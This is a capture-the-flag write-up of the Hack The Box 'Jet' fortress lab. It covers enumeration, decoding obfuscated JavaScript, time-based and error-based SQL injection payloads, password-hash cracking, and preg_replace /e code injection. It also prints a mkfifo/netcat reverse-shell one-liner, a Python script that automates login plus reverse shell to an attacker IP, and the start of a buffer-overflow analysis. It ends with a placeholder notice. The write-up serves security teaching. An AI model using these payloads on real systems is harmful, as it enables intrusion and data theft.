---
title: "Hackthebox: Jet [Fortress]"
author: c3l1kd
categories: [Hackthebox]
tags:
  [
    nmap,
    wfuzz,
    dns-recon,
    dig,
    etc-hosts,
    javascript-decoding,
    fromCharCode,
    sql-injection,
    burpsuite,
    sqlmap,
    http,
    ssh,
    reverse-dns,
    php,
    web-fuzzing,
    authentication-bypass,
  ]
render_with_liquid: false
img_path: /images/hackthebox_jet/
image:
  path: room_image.png
---

**Jet [Fortress]**In this lab, you will explore various security challenges. First, you'll <code class="highlight">Connect</code> to the environment and get started. As you progress, begin <code class="highlight">Digging in</code> to uncover hidden information. Move <code class="highlight">Going Deeper</code> to analyze and bypass authentication mechanisms. You'll learn how to handle **<code class="highlight">Command</code> execution vulnerabilities and buffer <code class="highlight">Overflown</code> exploits. There’s also a hidden <code class="highlight">Secret Message</code> that requires careful extraction. Understand the concept of <code class="highlight">Elasticity</code> in environments, and manage users with the <code class="highlight">Member Manager</code> feature. Lastly, uncover <code class="highlight">More Secrets</code> in the system and decode the final <code class="highlight">Memo</code>.

<style>
    .highlight {
 background-color: #ffeb3b;
      padding: 0 5px;
      color: red;
      border-radius: 3px;
}
</style>

[![Hackthebox Room Link](room_banner.png)](https://app.hackthebox.com/fortresses/1)
## Initial Enumeration

### Nmap Scan

```console
$ nmap 10.13.37.10
Nmap scan report for 
PORT     STATE SERVICE  
22/tcp   open  ssh
53/tcp   open  domain
80/tcp   open  http
5555/tcp open  freeciv
7777/tcp open  cbt
```

There are five open ports:

- **22** (SSH)
- **53/tcp**  (domain)
- **80/tcp**  (http)
- **5555/tcp**   (freeciv)
- **7777/tcp**   (cbt)


## First Flag [Method 1]

If we look at the website we can see a default page and also the `flag`.

![First Flag](01.png){: width="1200" height="800" }

## First Flag [Method 2]

We can see it from the console with a request curl looping through the string `JET`

```console
$ curl -s 10.13.37.10 | grep JET  
<b> JET{s*********k} </b>
```

## Digging in…

When we try to apply `fuzzing` to the web we only find several files, `.ht` however they return a code `403` so we simply do not have access

```console
$ wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.13.37.10/FUZZ -t 100 --hc 404  
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.13.37.10/FUZZ
Total requests: 4713

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000023:   403        7 L      11 W       178 Ch      ".hta"
000000024:   403        7 L      11 W       178 Ch      ".htaccess"
000000025:   403        7 L      11 W       178 Ch      ".htpasswd"
```

We have the port open `53` so we can perform a reverse resolution query `DNS` to get an `dominio` associated IP address

```console
$ dig@10.13.37.10 -x 10.13.37.10

; <<>> DiG 9.18.12-1-Debian <<>> @10.13.37.10 -x 10.13.37.10
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NXDOMAIN, id: 19872
;; flags: qr aa rd; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
;; QUESTION SECTION:
;10.37.13.10.in-addr.arpa.      IN      PTR

;; AUTHORITY SECTION:
37.13.10.in-addr.arpa.  604800  IN      SOA     www.securewebinc.jet. securewebinc.jet. 3 604800 86400 2419200 604800  

;; Query time: 96 msec
;; SERVER: 10.13.37.10#53(10.13.37.10) (UDP)
;; WHEN: Tue Apr 11 12:20:24 EDT 2023
;; MSG SIZE  rcvd: 109
```

that it knows where to resolve each time we point to it `dominio` , we add to the file `/etc/hosts` the address ip of the machine followed by the domain we have.

```console
$ echo "10.13.37.10 www.securewebinc.jet" | sudo tee -a /etc/hosts 
```

By visiting the web this time from dominio the bottom we can again `flag`


![Second Flag](02.png){: width="1200" height="800" }

## Going Deeper
In the `codigo` page source we can see that it loads 2 files with extension `js` , one is the template and the other has a rather interesting name: `secure.js`

![js files](03.png){: width="1200" height="800" }

We open it and find that it is not in clear text but in decimal.

![decimal](04.png){: width="1200" height="800" }

We can see it more comfortably from a request curl , the script converts the decimals to text with fromCharCode the String class and executes it witheval

```console
$ curl -s www.securewebinc.jet/js/secure.js
eval(String.fromCharCode(102,117,110,99,116,105,111,110,32,103,101,116,83,116,97,116,115,40,41,10,123,10,32,32,32,32,36,46,97,106,97,120,40,123,117,114,108,58,32,34,47,100,105,114,98,95,115,97,102,101,95,100,105,114,95,114,102,57,69,109,99,69,73,120,47,97,100,109,105,110,47,115,116,97,116,115,46,112,104,112,34,44,10,10,32,32,32,32,32,32,32,32,115,117,99,99,101,115,115,58,32,102,117,110,99,116,105,111,110,40,114,101,115,117,108,116,41,123,10,32,32,32,32,32,32,32,32,36,40,39,35,97,116,116,97,99,107,115,39,41,46,104,116,109,108,40,114,101,115,117,108,116,41,10,32,32,32,32,125,44,10,32,32,32,32,101,114,114,111,114,58,32,102,117,110,99,116,105,111,110,40,114,101,115,117,108,116,41,123,10,32,32,32,32,32,32,32,32,32,99,111,110,115,111,108,101,46,108,111,103,40,114,101,115,117,108,116,41,59,10,32,32,32,32,125,125,41,59,10,125,10,103,101,116,83,116,97,116,115,40,41,59,10,115,101,116,73,110,116,101,114,118,97,108,40,102,117,110,99,116,105,111,110,40,41,123,32,103,101,116,83,116,97,116,115,40,41,59,32,125,44,32,49,48,48,48,48,41,59));
```
Instead of running it with `eval` after passing it to text we can use a simple console.log to show the content in text on the console

```console
$ console.log(String.fromCharCode(102,117,110,99,116,105,111,110,32,103,101,116,83,116,97,116,115,40,41,10,123,10,32,32,32,32,36,46,97,106,97,120,40,123,117,114,108,58,32,34,47,100,105,114,98,95,115,97,102,101,95,100,105,114,95,114,102,57,69,109,99,69,73,120,47,97,100,109,105,110,47,115,116,97,116,115,46,112,104,112,34,44,10,10,32,32,32,32,32,32,32,32,115,117,99,99,101,115,115,58,32,102,117,110,99,116,105,111,110,40,114,101,115,117,108,116,41,123,10,32,32,32,32,32,32,32,32,36,40,39,35,97,116,116,97,99,107,115,39,41,46,104,116,109,108,40,114,101,115,117,108,116,41,10,32,32,32,32,125,44,10,32,32,32,32,101,114,114,111,114,58,32,102,117,110,99,116,105,111,110,40,114,101,115,117,108,116,41,123,10,32,32,32,32,32,32,32,32,32,99,111,110,115,111,108,101,46,108,111,103,40,114,101,115,117,108,116,41,59,10,32,32,32,32,125,125,41,59,10,125,10,103,101,116,83,116,97,116,115,40,41,59,10,115,101,116,73,110,116,101,114,118,97,108,40,102,117,110,99,116,105,111,110,40,41,123,32,103,101,116,83,116,97,116,115,40,41,59,32,125,44,32,49,48,48,48,48,41,59));
```
When we run it we can see that it makes a request to stats.php a directory which ruta would have been impossible to obtain by applying brute force.

```console
function getStats()
{
    $.ajax({url: "/dirb_safe_dir_rf9EmcEIx/admin/stats.php",  

        success: function(result){
        $('#attacks').html(result)
    },
    error: function(result){
         console.log(result);
    }});
}
getStats();
setInterval(function(){ getStats(); }, 10000);
```

By pointing to the directory and the file `stats.php` we can see that it returns only a numero which is not really clear what its purpose is.

![stats.php](05.png){: width="1200" height="800" }

If we remove it stats.php and stay on it /admin redirects us to login.php

![admin](06.png){: width="1200" height="800" }

In the codigo source login.php we find the flag in a comment


![Third Flag](07.png){: width="1200" height="800" }

## Bypassing Authentication

We have a `login` , default credentials as `admin:admin` they will not work for us

![login](08.png){: width="1200" height="800" }

However, when passing it as a name, `admin' and sleep(5)-- -` the website takes 5 seconds to give us a response, which means that it is vulnerable to a `inyeccion sql`

![inyeccion sql](09.png){: width="1200" height="800" }

By intercepting the request with burpsuite we can see how the data is processed

![brup](10.png){: width="1200" height="800" }

Let’s go with the easy way, we start by saving the request in a filerequest

```console
$ cat request
POST /dirb_safe_dir_rf9EmcEIx/admin/dologin.php HTTP/1.1  
Host: www.securewebinc.jet
Content-Length: 47
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://www.securewebinc.jet
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Accept-Language: es-419,es;q=0.9,en;q=0.8
Cookie: PHPSESSID=3aljq5nfoi1t34idu2dkm55nt2
Connection: close

username=admin&password=admin
```

We can use it `sqlmap` by passing it `-r` the request file and with the parameter `-dbs` we list the databases, we can find the dbjet `admin`

```console
$ sqlmap -r request --batch -dbs
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.7.2#stable}
|_ -| . ["]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[12:11:01] [INFO] parsing HTTP request from 'request'
[12:11:03] [INFO] resuming back-end DBMS 'mysql' 
[12:11:03] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND (SELECT 7805 FROM (SELECT(SLEEP(5)))BrBS)-- vOGO&password=admin  
---
[12:11:03] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.10.3
back-end DBMS: MySQL >= 5.0
[12:11:03] [INFO] fetching database names
[12:11:03] [INFO] resumed: 'information_schema'
[12:11:03] [INFO] resumed: 'jetadmin'
available databases [2]:
[*] information_schema
[*] jetadmin
```

Now we list the tables with `-tables` indicating the database `jetadmin` with the parameter `-D` , we can find only the table `users` in that database

```console
$ sqlmap -r request --batch -D jetadmin -tables
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.7.2#stable}
|_ -| . ["]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[12:12:49] [INFO] parsing HTTP request from 'request'
[12:12:49] [INFO] resuming back-end DBMS 'mysql' 
[12:12:49] [INFO] testing connection to the target URL
[12:12:50] [INFO] the back-end DBMS is MySQL
[12:12:50] [INFO] fetching tables for database: 'jetadmin'  
[12:12:50] [INFO] resumed: 'users'
Database: jetadmin
[1 table]
+-------+
| users |
+-------+
```

Now we can simply use the parameter `-dump` to dump all the existing columns in the users table and get a `hash` user `admin`


```console
$ sqlmap -r request --batch -D jetadmin -T users -dump
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.7.2#stable}
|_ -| . ["]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[12:14:33] [INFO] parsing HTTP request from 'request'
[12:14:34] [INFO] resuming back-end DBMS 'mysql' 
[12:14:34] [INFO] testing connection to the target URL
[12:14:34] [INFO] the back-end DBMS is MySQL
[12:14:34] [INFO] fetching columns for table 'users' in database 'jetadmin'
[12:14:34] [INFO] resumed: 'id'
[12:14:34] [INFO] resumed: 'int(11)'
[12:14:34] [INFO] resumed: 'username'
[12:14:34] [INFO] resumed: 'varchar(50)'
[12:14:34] [INFO] resumed: 'password'
[12:14:34] [INFO] resumed: 'varchar(191)'
[12:14:34] [INFO] fetching entries for table 'users' in database 'jetadmin'
[12:14:34] [INFO] resumed: '1'
[12:14:34] [INFO] resumed: '97114847aa12500d04c0ef3aa6ca1dfd8fca7f156eeb864ab9b0445b235d5084'  
[12:14:34] [INFO] resumed: 'admin'
Database: jetadmin
Table: users
[1 entry]
+----+------------------------------------------------------------------+----------+
| id | password                                                         | username |
+----+------------------------------------------------------------------+----------+
| 1  | 97114847aa12500d04c0ef3aa6ca1dfd8fca7f156eeb864ab9b0445b235d5084 | admin    |
+----+------------------------------------------------------------------+----------+
```
We saw that it can be listed with a `sql injection` time based, however when sending only one `'` as a username field it returns a 302 but before a `error`



![brup](11.png){: width="1200" height="800" }

Based on an [article](https://securiumsolutions.com/blog/sql-injection-by-double-query-securiumsolutions/) we can create one `query` for a sqli `error` based `doble query` to list the database in use `withdatabase()`

```console
' or (select 1 from(select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a)-- -
```

It should be noted that to send it we need `url condearlo` to do it from burpsuite with `Ctrl U` , we send and see in the response `jetadmin`

![jetadmin](12.png){: width="1200" height="800" }

We follow the same logic to read the databases, as it returns several results we will limit ourselves to one with `limit 0,1` , we see `information_schema`

```console
' or (select 1 from(select count(*),concat((select mid((ifnull(cast(schema_name as nchar),0x20)),1,54) from information_schema.schemata limit 0,1),floor(rand(0)*2))x from information_schema.plugins group by x)a)-- -
```

![jetadmin](13.png){: width="1200" height="800" }

We can concatenate several `querys` so we add a 0x20 for a space and copy it `query` this time changing `0,1 it 1,1` to to see both results

```console
' or (select 1 from(select count(*),concat((select mid((ifnull(cast(schema_name as nchar),0x20)),1,54) from information_schema.schemata limit 0,1),0x20,(select mid((ifnull(cast(schema_name as nchar),0x20)),1,54) from information_schema.schemata limit 1,1),0x20,floor(rand(0)*2))x from information_schema.plugins group by x)a)-- -
```

![jetadmin](14.png){: width="1200" height="800" }

There is only the database jetadmin so we will list itstablas

```console
' or (select 1 from(select count(*),concat((select mid((ifnull(cast(table_name as nchar),0x20)),1,54) from information_schema.tables where table_schema='jetadmin' limit 0,1),0x20,floor(rand(0)*2))x from information_schema.plugins group by x)a)-- -
```

![jetadmin](15.png){: width="1200" height="800" }

In the database jetadmin there is only the table users , so we can list its columnas , in this case we only found 3 id , username and password

```console
' or (select 1 from(select count(*),concat((select mid((ifnull(cast(column_name as nchar),0x20)),1,54) from information_schema.columns where table_schema='jetadmin' limit 0,1),0x20,(select mid((ifnull(cast(column_name as nchar),0x20)),1,54) from information_schema.columns where table_schema='jetadmin' limit 1,1),0x20,(select mid((ifnull(cast(column_name as nchar),0x20)),1,54) from information_schema.columns where table_schema='jetadmin' limit 2,1),0x20,floor(rand(0)*2))x from information_schema.plugins group by x)a)-- -
```

![jetadmin](16.png){: width="1200" height="800" }

Finally we dump the columns `username` and `password` separate them by :


```console
' or (select 1 from(select count(*),concat((select mid((ifnull(cast(username as nchar),0x20)),1,54) from users limit 0,1),0x3a,(select mid((ifnull(cast(password as nchar),0x20)),1,54) from users limit 0,1),0x20,floor(rand(0)*2))x from information_schema.plugins group by x)a)-- -
```
![jetadmin](17.png){: width="1200" height="800" }

We have the hash admin, we pass it to john and we get its password

```console
$ john -w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash --format=Raw-SHA256  
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA256 [SHA256 128/128 XOP 4x2])
Warning: poor OpenMP scalability for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
Hackthesystem200 (?)
Use the "--show --format=Raw-SHA256" options to display all of the cracked passwords reliably
Session completed.
```
We can log in adminwith the credentials adminwe got

![jetadmin](18.png){: width="1200" height="800" }

Now we can see a dashboard and in one of the messages we find the flag

![jetadmin](19.png){: width="1200" height="800" }

## Command

In the dashboard among other things we see a field where we can sendcorreos

![jetadmin](20.png){: width="1200" height="800" }

So we send an email simply filling in all the fields with test, when sending it it tells us to modify the message to pass the profanity filter

![jetadmin](21.png){: width="1200" height="800" }

Interceptando la petición además de nuestros campos ingresados podemos ver varios con swearwords como prefix, y las cambia por otras palabras, tambien vemos usa /i

![jetadmin](22.png){: width="1200" height="800" }

Leyendo un [articel](https://bitquark.co.uk/blog/2013/07/23/the_unexpected_dangers_of_preg_replace) sobre la función preg_replace() podemos ver que /i se usa para que sea case insentitive pero podemos usar /e como interprete de php, asi que podemos cambiarlo e inyectar codigo php para que nos ejecute el comando id

```console
swearwords[/fuck/i]=make+love
swearwords[/fuck/e]=system('id')
```
We can remove unnecessary fields, by changing our data to execute the command id we can see the user output reflected www-data


![jetadmin](23.png){: width="1200" height="800" }

We change our id for a payload with mkfifo y nc to send a revshell and our data is the following, there are special characters so we urlencode it

```console
$ swearwords[/fuck/e]=system('rm+/tmp/f;mkfifo+/tmp/f;cat+/tmp/f|/bin/bash+-i+2>%261|nc+10.10.14.10+443+>/tmp/f')&to=test@test.com&subject=test&message=fuck&_wysihtml5_mode=1
```
We send the data and receive a shell as `www-data` on the victim machine

![jetadmin](24.png){: width="1200" height="800" }

```console
$ sudo netcat -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.13.37.10 
www-data@jet:~/html/dirb_safe_dir_rf9EmcEIx/admin$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@jet:~/html/dirb_safe_dir_rf9EmcEIx/admin$ hostname -I  
10.13.37.10
www-data@jet:~/html/dirb_safe_dir_rf9EmcEIx/admin$
```
Although it is not necessary as an extra to automate gaining access we can create a script python that authenticates and sends the request with the `revshell`

```console
#!/usr/bin/python3
import requests, sys
from pwn import log

if len(sys.argv) < 2:
    log.failure(f"Uso: python3 {sys.argv[0]} <lhost> <lport>")
    sys.exit(1)

target = "http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin"
session = requests.Session()

auth = {"username": "admin", "password": "Hackthesystem200"}
data = {"swearwords[/fuck/e]": f"system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {sys.argv[1]} {sys.argv[2]} >/tmp/f')", "to": "test@test.com", "subject": "test", "message": "fuck", "_wysihtml5_mode": 1}  

session.post(target + "/dologin.php", data=auth)
session.post(target + "/email.php", data=data)
```

We run it passing our ip and port as argumentos and we get the shell

```console
python3 exploit.py 10.10.14.10 443
```
```console
$ sudo netcat -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.13.37.10
www-data@jet:~/html/dirb_safe_dir_rf9EmcEIx/admin$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@jet:~/html/dirb_safe_dir_rf9EmcEIx/admin$ hostname -I  
10.13.37.10
www-data@jet:~/html/dirb_safe_dir_rf9EmcEIx/admin$
```
Looking at the existing files in the current directory we see the flag, we read it

```console
www-data@jet:~/html/dirb_safe_dir_rf9EmcEIx/admin$ ls -l
-rw-r--r--  1 root root        33 Dec 20  2017 a_flag_is_here.txt
-rwxr-x---  1 root www-data   157 Jan  3  2018 auth.php
-rwxr-x---  1 root www-data    39 Dec 20  2017 badwords.txt
drwxr-x--- 32 root www-data  4096 Dec 20  2017 bower_components
drwxr-x---  6 root www-data  4096 Oct  9  2017 build
-rwxr-x---  1 root www-data    82 Dec 20  2017 conf.php
-rwxr-x---  1 root www-data 44067 Dec 27  2017 dashboard.php
-rwxr-x---  1 root www-data   600 Dec 20  2017 db.php
drwxr-x---  5 root www-data  4096 Oct  9  2017 dist
-rwxr-x---  1 root www-data   820 Dec 27  2017 dologin.php
-rwxr-x---  1 root www-data  2881 Dec 27  2017 email.php
-rwxr-x---  1 root www-data    43 Dec 20  2017 index.php
drwxr-x---  2 root www-data  4096 Dec 20  2017 js
-rwxr-x---  1 root www-data  3606 Dec 20  2017 login.php
-rwxr-x---  1 root www-data    98 Dec 20  2017 logout.php
drwxr-x--- 10 root www-data  4096 Dec 20  2017 plugins
-rwxr-x---  1 root www-data    21 Nov 14  2017 stats.php
drwxrwxrwx  2 root www-data  4096 Dec 20  2017 uploads
www-data@jet:~/html/dirb_safe_dir_rf9EmcEIx/admin$ cat a_flag_is_here.txt  
JET{p************d}
www-data@jet:~/html/dirb_safe_dir_rf9EmcEIx/admin$
```
## Overflown
Searching for files with privileges suid we found one out of the ordinary, leak

```console
www-data@jet:~$ find / -perm -4000 2>/dev/null  
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/snapd/snap-confine
/usr/bin/chsh
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/at
/usr/bin/newgidmap
/usr/bin/chfn
/usr/bin/sudo
/lib/uncompress.so
/home/leak
/bin/umount
/bin/su
/bin/fusermount
/bin/mount
/bin/ping
/bin/ntfs-3g
/bin/ping6
www-data@jet:~$
```

The file leak belongs to the user alex, it seems to be an execut able that gives us an address and asks us to exploit it, so it is probably a challenge

```console
www-data@jet:~$ ls -l /home/leak
-rwsr-xr-x 1 alex alex 9112 Dec 12  2017  **/home/leak**

www-data@jet:~$ /home/leak
Oops, I'm leaking! 0x7ffe4e813060
Pwn me ¯\_(ツ)_/¯
```
To exploit it we first need to analyze it locally, so we will download it, we can do it easily using netcat to send and receive it

```console
www-data@jet:~$ nc 10.10.14.10 4444 < /home/leak  
www-data@jet:~$
```
```console
$ nc -lvnp 4444 > leak
Listening on 0.0.0.0 4444
Connection received on 10.13.37.10
```
We can start by analyzing the binary with ida , we can see the functionmain

![jetadmin](25.png){: width="1200" height="800" }

It starts by defining a variable stringwith a 64byte buffer, then prints a message and the direcciónwhere it starts string, and receives the input withfgets

```console
int __fastcall main(int argc, const char **argv, const char **envp)  
{
  char string[64]; // [rsp+0h] [rbp-40h] BYREF

  _init(argc, argv, envp);
  printf("Oops, I'm leaking! %p\n", string);
  puts(aPwnMe);
  printf("> ");
  fgets(string, 512, stdin);
  return 0;
}
```
The function fgetsis vulnerable to Buffer Overflow also shows us the address of the input, and with checksecwe can see that the binary does not have protecciones

```console
checksec leak
[*] '/home/kali/leak'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)  
    RWX:      Has RWX segments
```
We start by creating a patron specially designed character set with gdb and running the program passing the pattern as input, the program gets corrupted

```console
$ gdb -q ./leak
Reading symbols from leak...
(No debugging symbols found in leak)
pwndbg> cyclic 100
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
pwndbg> run
Starting program: /home/kali/leak
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Oops, I'm leaking! 0x7fffffffe530
Pwn me ¯\_(ツ)_/¯ 
> aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa  

Program received signal SIGSEGV, Segmentation fault.
0x000000000040088e in main ()
pwndbg>
```
We can see the offset using pattern_offset gdb, just passing the value of the register RSP, we need 72bytes before overwriting the register RIP

```console
pwndbg> x/gx $rsp
0x7fffffffe578: 0x616161616161616a
pwndbg> cyclic -l 0x616161616161616a
Finding cyclic pattern of 8 bytes: b'jaaaaaaa' (hex: 0x6a61616161616161)  
Found at offset 72
pwndbg>
```
his time we create a chain of 72 A y 8 B to be able to debug the address

```console
python3 -q
>>> "A" * 72 + "B" * 8
'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB'  
>>>
```
Now we run the program passing our string as input, it gets corrupted

```console
gdb -q ./leak
Reading symbols from leak...
(No debugging symbols found in leak)
pwndbg> run
Starting program: /home/kali/leak
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Oops, I'm leaking! 0x7fffffffe530
Pwn me ¯\_(ツ)_/¯ 
> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB  

Program received signal SIGSEGV, Segmentation fault.
0x000000000040088e in main ()
pwndbg>
```
If we look at the contents of the address leaked a when running the program we can verify that it is indeed the direccion start of our input

```console
pwndbg> x/10gx 0x7fffffffe530
0x7fffffffe530: 0x4141414141414141  0x4141414141414141  
0x7fffffffe540: 0x4141414141414141  0x4141414141414141  
0x7fffffffe550: 0x4141414141414141  0x4141414141414141  
0x7fffffffe560: 0x4141414141414141  0x4141414141414141  
0x7fffffffe570: 0x4141414141414141  0x4242424242424242  
pwndbg>
```
n order to run the exploit that we will do from our machine we will play with socat so that the program runs and we have access from the port 9999


<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <style>
    .note-containers {
      max-width: 600px;
      width: 100%;
      padding: 20px;
      background-color: #28a745;
      color: white;
      border-radius: 15px;
      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
      text-align: center;
      margin: 0 auto; /* Ensures the second container is centered */
    }

    .note-containers p {
      font-size: 1.2rem;
      line-height: 1.6;
    }

    .note-containers strong {
      font-weight: bold;
      font-size: 1.3rem;
      color: #ffdd57;
    }
  </style>
</head>
<body>
  <div class="note-containers">
    <p>
      This writeup will be released <strong>soon!</strong>
    </p>
  </div>
</body>
</html>


